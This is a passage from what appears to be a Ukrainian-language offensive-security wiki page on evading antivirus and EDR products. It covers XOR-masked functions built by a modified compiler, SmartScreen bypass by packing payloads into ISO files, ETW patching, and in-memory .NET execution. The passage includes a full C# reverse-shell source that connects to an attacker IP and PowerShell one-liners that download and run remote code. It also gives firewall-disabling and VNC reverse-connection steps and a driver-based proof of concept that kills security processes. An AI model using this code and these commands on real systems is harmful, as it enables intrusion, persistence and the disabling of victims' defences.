Замість маскування всього імпланта лише під час простою, модифікований LLVM X86 backend може залишати вибрані функції XOR-маскованими, коли вони неактивні. PoC Function Peekaboo вибирає демангльовані імена, що містять `REG_`, вставляє position-independent заглушки входу/виходу навколо кінцевого машинного коду та розміщує один спільний обробник маскування в `.text`; сигнатури на рівні джерельного коду та Windows x64 calling convention залишаються незмінними.<sup>[[38]](#references)[[39]](#references)</sup>

#### Перетворення потоку керування в backend

Це має виконуватися після вибору інструкцій та оптимізації, оскільки перетворення має охоплювати **кожну згенеровану інструкцію повернення** та знати точне компонування x86. `MachineFunctionPass`, що виконується перед генерацією вихідного коду, знаходить останній `MachineInstr::isReturn()`, видаляє його, щоб останній шлях переходив до доданого епілогу, а попередні інструкції повернення замінює на `JMP_1 handler`. Залишайте будь-яке згенероване компілятором очищення стеку/кадру перед кожною інструкцією повернення; перенаправляйте лише саму інструкцію повернення.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` і `emitFunctionBodyEnd()` генерують заглушки для кожної функції, а `emitEndOfAsmFile()` — обробник. Символи, спільні для етапів генерації, дають змогу переходу з прологу вказувати на пізніше згенерований епілог; для вручну згенерованої near `je` запишіть `0F 84`, а потім чотирибайтовий MC expression `target - address_after_je`. Виклики та переходи до обробника можна натомість генерувати як об’єкти `MCInst` (`CALL64pcrel32` і `JMP_1`). Для невибраної функції, якщо нічого не змінено, pass має повертати `false`; PoC помилково повертає `true` у цьому випадку.<sup>[[38]](#references)[[39]](#references)</sup>

#### Метадані та ініціалізація до CRT

PoC розміщує XOR-ключ і записи розміром 16 байтів, які містять переміщуваний завантажувачем вказівник на функцію та довжину під час виконання, у `.funcmeta`. Хоча поле C має тип `uint32_t`, обробник звертається до QWORD за зміщенням `+8` у записі, зчитуючи довжину та її доповнення, і переходить між записами з кроком `0x10`. Імена секцій PE мають лише вісім байтів, тож під час пошуку секція називається `.funcmet`. Зовнішній patcher додає виконувану секцію `.stub`, зберігає старий RVA точки входу в заглушці та перенаправляє `AddressOfEntryPoint`; PIC-заглушка отримує базу образу через `gs:[0x60]` → `[PEB+0x10]`, проходить таблицю імпортів PE32+, щоб знайти вже імпортовану `VirtualProtect`, і виконується до CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Під час ініціалізації в `gs:[0xE8]` встановлюється sentinel і викликається кожна функція з метаданих. Пролог, що постійно залишається доступним для читання, записує початок функції в `gs:[0xF0]`, перевіряє sentinel і пропускає тіло, яке ще не було замасковано. Потім епілог виконує `call handler`; після того як обробник зберігає 13 регістрів (`0x68` байтів), адреса повернення в `[rsp+0x68]` відповідає кінцю перетвореної функції, тож `end - start` можна записати в її запис метаданих. Після маскування всіх тіл заглушка скидає sentinel і переходить до `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Під час звичайного виклику пролог викликає той самий симетричний обробник для декодування тіла. Останній шлях переходить до доданого епілогу, а кожне попереднє повернення переходить безпосередньо до спільного обробника. Звичайний епілог також використовує `jmp handler`, а не `call`, тож після повторного маскування `ret` обробника використовує адресу повернення початкового викликувача та зберігає результат функції в `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Примітив маскування та індикатори аналізу

Обробник знаходить поточний запис, пропускає фіксований видимий пролог (у цій збірці — `0x46` байтів), змінює права доступу до решти на `PAGE_EXECUTE_READWRITE`, виконує побайтовий XOR із молодшим байтом ключа, а потім встановлює `PAGE_EXECUTE_READ`. Таким чином, той самий цикл декодує тіло під час входу та кодує його під час кожного звичайного виходу.<sup>[[38]](#references)[[39]](#references)</sup>

До високоточних індикаторів цієї схеми належать:<sup>[[38]](#references)[[39]](#references)</sup>

- точка входу всередині виконуваної секції `.stub` і секція `.funcmet`, що містить ключ та переміщувані вказівники на `.text`;
- розбір PEB, таблиці імпортів і таблиці секцій до CRT, після чого виконуються виклики через кожен вказівник із метаданих;
- ідентичні PIC-прологи `call`/`pop` і численні місця повернення, перенаправлені до одного обробника;
- записування в `gs:[0xE8]`, `gs:[0xF0]` і `gs:[0xF8]`, після якого відбуваються повторювані зміни прав доступу через `VirtualProtect` та побайтовий XOR-запис у виконувані сторінки, прив’язані до образу.

Це спосіб ухилення від сканерів пам’яті, а не криптографічний захист: пропатчений файл усе ще містить початкове незашифроване тіло, а налагоджувач може зупинитися на `VirtualProtect` або циклі XOR і зняти дамп активної функції. Однобайтовий XOR, метадані у відкритому вигляді та фіксована межа `0x46` також спрощують відновлення офлайн.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Слоти TEB у PoC є локальними для потоку, але змінені сторінки коду спільні для процесу. Тому паралельний або рекурсивний вхід може повторно перемикати інструкції, поки виконується інший виклик; винятки та нелокальні виходи також можуть обійти повторне маскування. Надійна реалізація має синхронізувати перемикання, відновлювати фактичні права доступу, повернуті через `lpflOldProtect`, уникати жорстко заданої довжини заглушки, перевіряти вирівнювання стека x64 на обох шляхах — `call` і `jmp` — та викликати `FlushInstructionCache` після переписування виконуваних байтів. Microsoft прямо покладає на викликача відповідальність за узгодженість кешу інструкцій у разі зміни виконуваного коду.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen і MoTW

Можливо, ви бачили цей екран під час завантаження деяких виконуваних файлів з інтернету та їх запуску.

Microsoft Defender SmartScreen — це механізм безпеки, покликаний захистити кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно працює на основі репутації: застосунки, які завантажують нечасто, спричиняють появу SmartScreen, який попереджає кінцевого користувача та не дає запустити файл (хоча його все ще можна запустити, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється під час завантаження файлів з інтернету та містить URL, з якого файл було завантажено.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка Zone.Identifier ADS файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не спричинятимуть появу SmartScreen**.

Дуже ефективний спосіб не допустити отримання вашими payload позначки Mark of The Web — запакувати їх у контейнер, наприклад ISO. Це працює, оскільки Mark-of-the-Web (MOTW) **не можна** застосувати до томів, відмінних від **NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це інструмент, який пакує payload у вихідні контейнери, щоб уникнути Mark-of-the-Web.

Приклад використання:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ось демонстрація обходу SmartScreen шляхом пакування payloads в ISO-файли за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм журналювання у Windows, який дає змогу програмам і системним компонентам **записувати події в журнал**. Однак його також можуть використовувати продукти безпеки для моніторингу й виявлення шкідливої активності.

Так само, як можна вимкнути (обійти) AMSI, можна також змусити функцію **`EtwEventWrite`** процесу в user space негайно повертати керування, не записуючи жодних подій. Для цього функцію патчать у пам’яті, щоб вона негайно повертала керування, фактично вимикаючи журналювання ETW для цього процесу.

Докладніше можна дізнатися тут: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) і [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Рефлексія C#-збірок

Завантаження C#-бінарників у пам’ять відоме вже досить давно й досі є чудовим способом запускати інструменти post-exploitation, не потрапляючи на очі AV.

Оскільки payload завантажується безпосередньо в пам’ять, не торкаючись диска, нам потрібно буде подбати лише про патчинг AMSI для всього процесу.

Більшість C2-фреймворків (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) вже дають змогу виконувати C#-збірки безпосередньо в пам’яті, але є різні способи це зробити:

- **Fork\&Run**

Цей метод передбачає **запуск нового sacrificial process**, ін’єкцію шкідливого коду post-exploitation у цей процес, виконання коду й завершення нового процесу після цього. Цей метод має як переваги, так і недоліки. Перевага методу fork and run полягає в тому, що виконання відбувається **поза** процесом нашого імпланта Beacon. Це означає, що якщо під час дій post-exploitation щось піде не так або нас виявлять, імовірність **зберегти імплант** буде **значно вищою**. Недолік у тому, що **ймовірність** виявлення **поведінковими засобами виявлення** буде вищою.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Цей метод передбачає ін’єкцію шкідливого коду post-exploitation **у власний процес**. Так можна уникнути створення нового процесу та його сканування AV, але недолік у тому, що якщо під час виконання payload щось піде не так, **імовірність втратити beacon буде значно вищою**, оскільки він може аварійно завершитися.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Щоб дізнатися більше про завантаження C#-збірок, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Також можна завантажувати C#-збірки **з PowerShell**. Перегляньте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео від S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Перепакування інструментів .NET у WebAssembly за допомогою NativeAOT (WasmForge)

Звичайні методи `execute-assembly` залишають розпізнаваний MSIL і зрештою ініціалізують CLR. **WasmForge** змінює саму основу виконання: він переносить C#-проєкт на експериментальну ціль NativeAOT-LLVM WASI, компілює його заздалегідь у WebAssembly і вбудовує цей модуль у Windows PE-хост на основі Wazero. Отриманому процесу не потрібні CLR, JIT чи хост `dotnet` на цільовій системі, тож правила, що ґрунтуються лише на назвах керованих збірок, завантаженні CLR, AMSI або .NET ETW, не матимуть прямої видимості. Це техніка ухилення/пакування, а не обхід межі привілеїв — гостьовий код зберігає дозволи оригінального інструмента й ту саму спостережувану поведінку в ОС.<sup>[[44]](#references)[[45]](#references)</sup>

### Збирання C#-проєкту

Рекомендований спосіб збирання — Docker-середовище проєкту, оскільки воно містить .NET 10 SDK, workload NativeAOT-LLVM, WASI SDK 24.0, компонувальник і залежності для підписування. Файл `.csproj` визначається автоматично; одноетапне збирання виконує міграцію, виправлення сумісності, компіляцію WASM, створення PE і підписування.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Для усунення несправностей або перевірки згенерованого коду розбийте процес на `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` і фінальну команду `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. У середовищі збірки також використовується обгортка `wasm-component-ld`, щоб уникнути кодування компонента WASI Preview 2 і створити звичайний модуль, якого очікує вбудоване середовище виконання.<sup>[[44]](#references)[[45]](#references)</sup>

### Поєднання wasm32 C# із x64 Win32

Це не прозора повторна компіляція. У NativeAOT-WASI відсутні деякі функції BCL, орієнтовані на Windows, або вони працюють інакше, а гостьове середовище wasm32 зазвичай виділяє чотирибайтові слоти для покажчиків, тоді як API x64 можуть повертати восьмибайтові покажчики. WasmForge розв'язує обидві проблеми за допомогою таких згенерованих рівнів:<sup>[[44]](#references)</sup>

1. Патчер вихідного коду виправляє семантичні відмінності, специфічні для AOT, і перенаправляє непідтримувані виклики до реєстру, каналів, WMI, керування ідентичністю, служб каталогів, версій файлів, LSA та подібні виклики до допоміжних функцій `Wf*`.
2. Сканер P/Invoke створює зіставлення NativeAOT `DirectPInvoke`, щоб виклики `[DllImport]` прив'язувалися до скомпонованих символів мосту C, а не завантажували динамічно оголошену DLL усередині гостьового середовища.
3. Для покажчиків, що передаються на хост, у C# використовується `ulong`, а в C — `uint64_t`. Універсальний диспетчер передає виклик обробнику Win32 на хості; `out8_mask` позначає справжні восьмибайтові вихідні слоти, старші половини яких потрібно зберегти. Для непозначених вихідних даних у форматі wasm32 використовується захист зі знімком і відновленням, щоб запис x64 не пошкодив сусідні чотири байти.
4. Спеціалізовані мости хоста обробляють операції, що не вкладаються в універсальну диспетчеризацію системних викликів, як-от доступ до кешу квитків LSA, операції Kerberos/BCrypt зі структурованими результатами, TCP-трафік KDC і запити LDAP.

Наприклад, обгортка для `version.dll!VerQueryValueW` передає чотири адреси хоста й установлює біти 2 і 3 (`0xC`), оскільки покажчик на значення та його довжина — це восьмибайтові вихідні слоти. Сама обгортка залишається універсальною й передає назву DLL, назву експорту, аргументи та маску до `wf_call_v2`; хост виконує перетворення покажчиків і викликає нативний API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Обмеження та точки для виявлення

Код із великою кількістю reflection, динамічне завантаження збірок, довільні native callbacks і складні структури x64, що повертаються в пам’ять WASM, усе ще можуть потребувати окремих патчів для кожного інструмента або взагалі не працювати. Універсальні сокети WASI Preview 2 також можуть потрапляти до заглушок no-op, тому підтримувані інструменти використовують host shims для конкретних протоколів. Перевіряйте кожну команду на нативній збірці, а не припускайте, що функціональність однакова.<sup>[[44]](#references)[[45]](#references)</sup>

Цей підхід змінює телеметрію, а не робить payload невидимим. Виявлення може спиратися на PE, який містить або матеріалізує модуль WASM, поведінку runtime на кшталт Wazero, незвичне виділення та копіювання пам’яті host/guest, універсальну пряму диспетчеризацію Win32, аномалії підпису та PE-ресурсів, а також подальші виклики API і мережевий трафік. Тому відсутність подій завантаження CLR, AMSI або .NET ETW не слід вважати доказом того, що процес безпечний.<sup>[[44]](#references)</sup>

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можна виконувати шкідливий код іншими мовами, надавши скомпрометованій машині доступ **до середовища інтерпретатора, встановленого на SMB-ресурсі під контролем зловмисника**.

Надавши доступ до бінарних файлів інтерпретаторів і середовища на SMB-ресурсі, можна **виконувати довільний код цими мовами в пам’яті** скомпрометованої машини.

У репозиторії зазначено: Defender усе ще сканує скрипти, але використання Go, Java, PHP тощо дає нам **більше гнучкості для обходу статичних сигнатур**. Тестування випадкових, не обфускованих скриптів reverse shell цими мовами виявилося успішним.

## WebAssembly re-hosting for static-analysis evasion

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping змінює access token продукту безпеки, наприклад EDR або AV. Зниження привілеїв токена може залишити процес запущеним, водночас не даючи йому виконувати привілейовану перевірку або дії з усунення загроз.

Щоб запобігти цьому, Windows могла б **заборонити зовнішнім процесам** отримувати handles до токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання довіреного ПЗ

### Chrome Remote Desktop

Як описано в [**цій публікації в блозі**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), достатньо просто розгорнути Chrome Remote Desktop на ПК жертви, а потім використати його, щоб отримати над ним контроль і закріпитися в системі:<sup>[[35]](#references)</sup>
1. Завантажте програму з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім натисніть MSI-файл для Windows, щоб завантажити його.
2. Запустіть інсталятор у тихому режимі на машині жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть Next. Майстер попросить вас авторизуватися; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте надану команду з потрібними змінами: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметр `--pin` задає PIN без використання графічного інтерфейсу).
 

## Розширений обхід засобів виявлення

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Обхід засобів виявлення — дуже складна тема. Іноді потрібно враховувати багато різних джерел телеметрії в одній системі, тож у зрілих середовищах повністю залишатися непоміченим практично неможливо.

Кожне середовище, з яким ви зіткнетеся, матиме свої сильні та слабкі сторони.

Наполегливо раджу переглянути цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб ознайомитися з розширеними техніками обходу засобів виявлення.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це ще одна чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про багаторівневий обхід засобів виявлення.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Застарілі техніки**

### **Перевірка, які частини Defender вважає шкідливими**

Можна скористатися [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видаляє частини бінарного файла**, доки **не визначить, яку його частину Defender** вважає шкідливою, і розбиває її для вас.\
Інший інструмент, що робить **те саме, —** [**avred**](https://github.com/dobin/avred), який також надає цю послугу через вебінтерфейс на [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows 10 усі версії Windows постачалися з **Telnet server**, який можна було встановити (як адміністратор), виконавши:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Налаштуйте його на **запуск** під час запуску системи та **запустіть** його зараз:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Змінити порт telnet** (непомітно) та вимкнути брандмауер:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Завантажте його звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (потрібні завантаження bin, а не інсталятор)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть параметр _Disable TrayIcon_
- Установіть пароль у _VNC Password_
- Установіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **комп’ютер жертви**

#### **Reverse connection**

**Нападник** має **запустити на своєму хості** бінарний файл `vncviewer.exe -listen 5900`, щоб підготувати його до приймання зворотного **VNC-з’єднання**. Потім на **комп’ютері жертви** запустіть daemon winvnc командою `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ПОПЕРЕДЖЕННЯ:** Щоб залишатися непомітним, не робіть такого:

- Не запускайте `winvnc`, якщо він уже працює, інакше з’явиться [спливаюче вікно](https://i.imgur.com/1SROTTl.png). Перевірте, чи він працює, командою `tasklist | findstr winvnc`
- Не запускайте `winvnc`, якщо в тій самій директорії немає `UltraVNC.ini`, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для перегляду довідки, інакше з’явиться [спливаюче вікно](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте його звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Усередині GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Поточний Defender дуже швидко завершить процес.**

### Компіляція власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# reverse shell

Скомпілюйте його за допомогою:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Використовуйте це з:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# з використанням компілятора

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання Python для створення інжекторів: приклад

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Знищення AV/EDR з режиму ядра

Storm-2603 використовував невелику консольну утиліту під назвою **Antivirus Terminator**, щоб вимкнути захист кінцевих точок перед запуском ransomware. Інструмент постачається зі **власним вразливим, але *підписаним* драйвером** і зловживає ним для виконання привілейованих операцій ядра, які не можуть заблокувати навіть AV-сервіси з Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Основні висновки
1. **Підписаний драйвер**: Файл, що записується на диск, — це `ServiceMouse.sys`, але насправді це легітимно підписаний драйвер `AToolsKrnl64.sys` із «System In-Depth Analysis Toolkit» від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть за ввімкненого Driver-Signature-Enforcement (DSE).
2. **Встановлення служби**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Перший рядок реєструє драйвер як **службу ядра**, а другий запускає його, щоб `\\.\ServiceMouse` став доступним із простору користувача.
3. **IOCTL, які надає драйвер**
   | Код IOCTL | Можливість                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Завершити довільний процес за PID (використовується для завершення служб Defender/EDR) |
   | `0x990000D0` | Видалити довільний файл із диска |
   | `0x990001D0` | Вивантажити драйвер і видалити службу |

   Мінімальний proof-of-concept на C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Чому це працює**: BYOVD повністю обходить захисти user-mode; код, що виконується в kernel, може відкривати *захищені* процеси, завершувати їх або втручатися в об’єкти kernel незалежно від PPL/PP, ELAM чи інших функцій посилення захисту.

Виявлення / пом’якшення наслідків
